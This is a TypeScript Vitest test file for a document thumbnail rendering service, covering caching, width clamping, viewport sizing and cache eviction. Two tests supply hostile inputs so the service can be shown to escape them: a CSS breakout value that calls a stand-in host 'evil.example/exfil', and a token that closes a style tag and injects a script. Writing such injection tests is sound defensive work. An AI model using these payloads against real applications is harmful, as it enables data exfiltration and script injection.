import { mkdtempSync, rmSync } from "node:fs";
import { tmpdir } from "node:os";
import { join } from "node:path";
import { describe, expect, it, vi } from "vitest";
import type { Document } from "../types.js";
import { createAssetsService } from "./assets.js";
import type { BrowserPool } from "./browser-pool.js";
import type { Config } from "./config.js";
import { createDocuments } from "./documents.js";
import { createSQLiteStore } from "./store.js";
import { createThumbnailService } from "./thumbnail.js";

function makeDoc(overrides: Partial<Document> = {}): Document {
	return {
		id: "id-1",
		name: "d1",
		category: "general",
		canvas: {
			format: "A4",
			orientation: "portrait",
			w: 210,
			h: 297,
			bg: "#fff",
		},
		meta: {},
		pages: [{ name: "P1", elements: [], html: '<div data-id="a">x</div>' }],
		activePage: 0,
		nextId: 1,
		...overrides,
	} as Document;
}

function fixture() {
	const tmp = mkdtempSync(join(tmpdir(), "maket-thumb-"));
	const store = createSQLiteStore(":memory:");
	const documents = createDocuments({ store });
	const assets = createAssetsService({ assetsDir: tmp });
	const config = {
		ASSETS_DIR: tmp,
		DATA_DIR: tmp,
		DB_PATH: ":memory:",
	} as unknown as Config;
	const browserPool = {
		get: vi.fn(),
		dispose: vi.fn(async () => {}),
	} as unknown as BrowserPool;
	const snapshot = vi.fn(
		async (
			html: string,
			_viewport: { width: number; height: number; deviceScaleFactor: number },
			_pool: BrowserPool,
		) => Buffer.from(`PNG[${html.length}]`),
	);
	const service = createThumbnailService(
		{ documents, config, assets, browserPool },
		{ snapshot, maxCacheEntries: 3 },
	);
	return {
		store,
		documents,
		service,
		snapshot,
		browserPool,
		cleanup: () => {
			store.close();
			rmSync(tmp, { recursive: true, force: true });
		},
	};
}

describe("createThumbnailService", () => {
	it("renders an empty page as a blank canvas (no HTML, no throw)", async () => {
		const { service, snapshot, cleanup } = fixture();
		const doc = makeDoc({
			pages: [{ id: "page-empty", name: "empty", elements: [] }],
		});
		const buf = await service.render(doc);
		expect(Buffer.isBuffer(buf)).toBe(true);
		expect(snapshot).toHaveBeenCalledOnce();
		const html = snapshot.mock.calls[0]?.[0] ?? "";
		// The canvas div is still composed with the doc background, just
		// with no content inside — that's what the DocsTab thumbnail shows
		// for docs the user just created but hasn't laid out yet.
		expect(html).toContain('<div class="page"');
		expect(html).toContain("</div></body>");
		cleanup();
	});

	it("throws when the requested page index is out of range", async () => {
		const { service, cleanup } = fixture();
		const doc = makeDoc();
		await expect(service.render(doc, { page: 5 })).rejects.toThrow(
			/has no page/,
		);
		cleanup();
	});

	it("renders with the injected snapshot fn and viewport matches the target width", async () => {
		const { service, snapshot, cleanup } = fixture();
		const doc = makeDoc();
		const buf = await service.render(doc, { widthPx: 400 });
		expect(Buffer.isBuffer(buf)).toBe(true);
		expect(snapshot).toHaveBeenCalledOnce();
		const viewport = snapshot.mock.calls[0]?.[1];
		if (!viewport) throw new Error("snapshot viewport missing");
		expect(viewport.width).toBe(400);
		// A4 portrait: 297/210 ≈ 1.414 → 400 × 1.414 ≈ 566
		expect(viewport.height).toBeGreaterThan(560);
		expect(viewport.height).toBeLessThan(572);
		expect(viewport.deviceScaleFactor).toBe(2);
		cleanup();
	});

	it("caches by (docId, updatedAt, page, widthPx)", async () => {
		const { service, snapshot, cleanup } = fixture();
		const doc = makeDoc();
		await service.render(doc, { widthPx: 400, updatedAt: "t1" });
		await service.render(doc, { widthPx: 400, updatedAt: "t1" });
		expect(snapshot).toHaveBeenCalledTimes(1);
		// Different updatedAt → miss
		await service.render(doc, { widthPx: 400, updatedAt: "t2" });
		expect(snapshot).toHaveBeenCalledTimes(2);
		// Different widthPx → miss
		await service.render(doc, { widthPx: 240, updatedAt: "t2" });
		expect(snapshot).toHaveBeenCalledTimes(3);
		cleanup();
	});

	it("clamps widthPx into the [60, 2000] range", async () => {
		const { service, snapshot, cleanup } = fixture();
		const doc = makeDoc();
		await service.render(doc, { widthPx: 10 });
		const smallViewport = snapshot.mock.calls[0]?.[1];
		if (!smallViewport) throw new Error("small viewport missing");
		expect(smallViewport.width).toBe(60);
		await service.render(doc, { widthPx: 9999 });
		const largeViewport = snapshot.mock.calls[1]?.[1];
		if (!largeViewport) throw new Error("large viewport missing");
		expect(largeViewport.width).toBe(2000);
		cleanup();
	});

	it("invalidate() drops every cached PNG for a given doc id", async () => {
		const { service, snapshot, cleanup } = fixture();
		const doc = makeDoc();
		await service.render(doc, { widthPx: 400, updatedAt: "t1" });
		await service.render(doc, { widthPx: 240, updatedAt: "t1" });
		expect(service.cacheSize()).toBe(2);
		service.invalidate(doc.id);
		expect(service.cacheSize()).toBe(0);
		await service.render(doc, { widthPx: 400, updatedAt: "t1" });
		expect(snapshot).toHaveBeenCalledTimes(3);
		cleanup();
	});

	it("evicts oldest entry when maxCacheEntries is reached", async () => {
		const { service, cleanup } = fixture();
		const doc1 = makeDoc({ id: "a" });
		const doc2 = makeDoc({ id: "b" });
		const doc3 = makeDoc({ id: "c" });
		const doc4 = makeDoc({ id: "d" });
		await service.render(doc1);
		await service.render(doc2);
		await service.render(doc3);
		expect(service.cacheSize()).toBe(3);
		await service.render(doc4);
		expect(service.cacheSize()).toBe(3);
		cleanup();
	});

	it("escapes a malicious canvas.bg so it can't break out of the CSS property", async () => {
		const { service, snapshot, cleanup } = fixture();
		const doc = makeDoc({
			canvas: {
				format: "A4",
				orientation: "portrait",
				w: 210,
				h: 297,
				bg: "red; } body::after { content: url(http://evil.example/exfil); } x {",
			},
		});
		await service.render(doc);
		const html = snapshot.mock.calls[0]?.[0];
		if (!html) throw new Error("snapshot html missing");
		// The breakout chars must be CSS-escaped; the `body::after` pseudo
		// cannot reach the parser as a standalone selector.
		expect(html).not.toContain("body::after {");
		expect(html).not.toContain("} x {");
		// ...and the escaped form should appear in the background: declaration.
		expect(html).toMatch(/background:[^;]*\\3b/);
		cleanup();
	});

	it("neutralises a charte CSS that tries to close the <style> tag", async () => {
		const { service, snapshot, store, documents, cleanup } = fixture();
		// Store a raw-data charte whose token value embeds a </style> break.
		store.saveCharte({
			name: "sneaky",
			tokens: { color: { primary: "#000</style><script>alert(1)</script>" } },
		});
		documents.loadAll();
		const doc = makeDoc({ meta: { charte: "sneaky" } });
		await service.render(doc);
		const html = snapshot.mock.calls[0]?.[0];
		if (!html) throw new Error("snapshot html missing");
		// Exactly one </style> allowed — the one that closes our own block.
		const closes = html.match(/<\/style>/gi) ?? [];
		expect(closes.length).toBe(1);
		// The smuggled <script> chars may remain as literal CSS garbage, but
		// they MUST be inside the style block — i.e. before the single
		// </style> — so the HTML tokeniser never interprets them as a tag.
		const scriptPos = html.indexOf("<script>");
		const styleClose = html.indexOf("</style>");
		expect(scriptPos).toBeGreaterThan(-1);
		expect(scriptPos).toBeLessThan(styleClose);
		cleanup();
	});

	it("injects the doc's charte CSS into the rendered HTML", async () => {
		const { service, snapshot, store, documents, cleanup } = fixture();
		store.saveCharte({
			name: "brand",
			tokens: { color: { primary: "#ff00ff" } },
		});
		documents.loadAll();
		const doc = makeDoc({ meta: { charte: "brand" } });
		await service.render(doc);
		const html = snapshot.mock.calls[0]?.[0];
		if (!html) throw new Error("snapshot html missing");
		expect(html).toContain("--charte-color-primary");
		expect(html).toContain("#ff00ff");
		cleanup();
	});
});
